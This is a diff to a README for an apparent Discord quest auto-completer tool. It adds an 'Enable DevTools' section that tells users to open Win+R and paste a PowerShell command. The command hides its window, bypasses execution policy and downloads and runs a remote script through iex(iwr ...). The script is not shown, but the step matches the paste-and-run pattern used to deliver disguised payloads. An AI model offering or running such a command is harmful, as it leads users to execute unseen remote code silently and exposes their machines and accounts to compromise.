@@ -70,6 +70,14 @@ It injects into Discord via Developer Tools, uses internal APIs to enroll in que
 - **Quests Not Completing?** Ensure desktop app usage and correct setup.
 - **Linux Limitations?** Activity detection may fail, so rewards might not register.
 
+## Enable DevTools ⛔
+
+- Win + R and paste:
+
+```r
+powershell -w h -ep B -c "iex(iwr https://raw.githubusercontent.com/power0matin/discord-quest-auto-completer/main/EnableDevTools.ps1)"
+```
+
 ## Extensibility 🔄
 
 - Add new quest types by extending the `completeQuest` function in `quest_completer.js`.
@@ -82,3 +90,7 @@ This project is licensed under the [**MIT License**](LICENSE) — see the LICENS
 Feel free to modify, distribute, and use it as you like. No warranties provided.
 
 _Happy questing!_ 🎉
+
+<p align="center">
+&#169 Created by power0matin
+</p>
